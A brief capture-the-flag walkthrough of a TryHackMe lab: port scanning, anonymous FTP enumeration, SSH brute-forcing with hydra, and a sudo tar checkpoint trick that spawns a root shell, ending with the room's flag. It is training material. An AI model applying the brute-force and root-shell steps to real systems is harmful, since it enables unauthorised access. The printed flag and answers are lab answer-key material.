## Table of Contents

- [Enumeration](#enumeration)
          - [Initial Access](#Initial\Access)
          - [Privilege Escalation](#Privilege\Escalation)
          - [I am GRoot](#I\am\GRoot)

`MY_IP=10.6.34.114`
`MACHINE_IP=10.10.9.251`

# Enumeration
```bash
nmap -p- --min-rate 10000 --open MACHINE_IP
```
Open ports:
`21/tcp open ftp
`22/tcp open ssh`
`80/tcp open http`
![[Pasted image 20231224005134.png]]
As we can see, ftp is available for Anonymous Authentication.... Lets check it out.

![[Pasted image 20231224010243.png]]
- User Found: `lin` 
![[Pasted image 20231224010331.png]]

**Q1**: `lin`

Now that we know one of the user's, lets try to brute force SSH via `hydra`.

###### Initial Access
![[Pasted image 20231224011523.png]]
###### Privilege Escalation
```bash
sudo -l 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
User lin may run the following commands on bountyhacker:
(root) /bin/tar
```
###### I am GRoot
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
`cat /root/root.txt`
**THM{80UN7Y_h4cK3r}**


















